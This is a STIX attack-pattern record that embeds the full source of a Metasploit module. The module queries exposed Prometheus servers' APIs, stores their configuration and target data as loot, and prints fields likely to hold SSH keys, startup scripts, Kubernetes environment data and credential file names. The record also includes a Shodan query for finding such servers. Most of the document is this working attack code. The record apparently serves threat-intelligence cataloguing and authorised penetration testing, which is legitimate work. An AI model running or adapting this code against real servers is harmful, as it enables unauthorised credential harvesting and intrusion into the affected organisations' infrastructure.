{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08c62bf3-f985-4a63-bd97-425ef0f9c676",
    "created": "2024-08-14T16:32:36.389937Z",
    "modified": "2024-08-14T16:32:36.389941Z",
    "name": "Prometheus API Information Gather",
    "description": " This module utilizes Prometheus' API calls to gather information about the server's configuration, and targets. Fields which may contain credentials, or credential file names are then pulled out and printed.  Targets may have a wealth of information, this module will print the following values when found: __meta_gce_metadata_ssh_keys, __meta_gce_metadata_startup_script __meta_gce_metadata_kube_env, kubernetes_sd_configs _meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration __meta_ec2_tag_CreatedBy, __meta_ec2_tag_OwnedBy  Shodan search: \"http.favicon.hash:-1399433489\"  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/prometheus_api_gather.rb",
            "external_id": "prometheus_api_gather.rb"
        },
        {
            "source_name": "reference",
            "url": "https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Prometheus\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Prometheus API Information Gather',\n        'Description' => %q{\n          This module utilizes Prometheus' API calls to gather information about\n          the server's configuration, and targets. Fields which may contain\n          credentials, or credential file names are then pulled out and printed.\n\n          Targets may have a wealth of information, this module will print the following\n          values when found:\n          __meta_gce_metadata_ssh_keys, __meta_gce_metadata_startup_script,\n          __meta_gce_metadata_kube_env, kubernetes_sd_configs,\n          _meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration,\n          __meta_ec2_tag_CreatedBy, __meta_ec2_tag_OwnedBy\n\n          Shodan search: \"http.favicon.hash:-1399433489\"\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die'\n        ],\n        'References' => [\n          ['URL', 'https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/']\n        ],\n\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2016-07-01', # Prometheus 1.0 release date, who knows....\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(9090),\n        OptString.new('TARGETURI', [ true, 'The URI of Prometheus', '/'])\n      ]\n    )\n  end\n\n  def run\n    vprint_status(\"#{peer} - Checking build info\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'status', 'buildinfo'),\n      'method' => 'GET'\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response from server (response code #{res.code})\") unless res.code == 200\n    json = res.get_json_document\n    version = json.dig('data', 'version')\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response from server (unable to find version number)\") unless version\n    print_good(\"Prometheus found, version: #{version}\")\n\n    vprint_status(\"#{peer} - Checking status config\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'status', 'config'),\n      'method' => 'GET'\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response from server (response code #{res.code})\") unless res.code == 200\n    json = res.get_json_document\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to parse JSON document\") unless json\n    yaml = json.dig('data', 'yaml')\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response from server (unable to find yaml)\") unless yaml\n    begin\n      yamlconf = YAML.safe_load(yaml)\n      loot_path = store_loot('Prometheus YAML Config', 'application/yaml', datastore['RHOST'], yaml, 'config.yaml')\n      print_good(\"YAML config saved to #{loot_path}\")\n      prometheus_config_eater(yamlconf)\n    rescue Psych::DisallowedClass\n      # [-] Auxiliary failed: Psych::DisallowedClass Tried to load unspecified class: Symbol\n      print_bad('Unable to load YAML')\n    end\n\n    vprint_status(\"#{peer} - Checking targets\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'targets'),\n      'method' => 'GET'\n    )\n    table_targets = Rex::Text::Table.new(\n      'Header' => 'Target Data',\n      'Indent' => 2,\n      'Columns' =>\n      [\n        'Field',\n        'Data'\n      ]\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response from server (response code #{res.code})\") unless res.code == 200\n\n    json = res.get_json_document\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to parse JSON document\") unless json\n    loot_path = store_loot('Prometheus JSON targets', 'application/json', datastore['RHOST'], json.to_json, 'targets.json')\n    print_good(\"JSON targets saved to #{loot_path}\")\n    json.dig('data', 'activeTargets').each do |target|\n      [\n        '__meta_gce_metadata_ssh_keys', '__meta_gce_metadata_startup_script', '__meta_gce_metadata_kube_env', 'kubernetes_sd_configs',\n        '_meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration', '__meta_ec2_tag_CreatedBy', '__meta_ec2_tag_OwnedBy'\n      ].each do |key|\n        if target[key]\n          table_targets << [\n            key,\n            target[key]\n          ]\n        end\n\n        next unless target.dig('discoveredLabels', key)\n\n        table_targets << [\n          key,\n          target.dig('discoveredLabels', key)\n        ]\n      end\n    end\n\n    print_good(table_targets.to_s) if !table_targets.rows.empty?\n\n    vprint_status(\"#{peer} - Checking status flags\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'status', 'flags'),\n      'method' => 'GET'\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response from server (response code #{res.code})\") unless res.code == 200\n    json = res.get_json_document\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to parse JSON document\") unless json\n    print_good(\"Config file: #{json.dig('data', 'config.file')}\") if json.dig('data', 'config.file')\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-01, # Prometheus 1.0 release date, who knows...."
}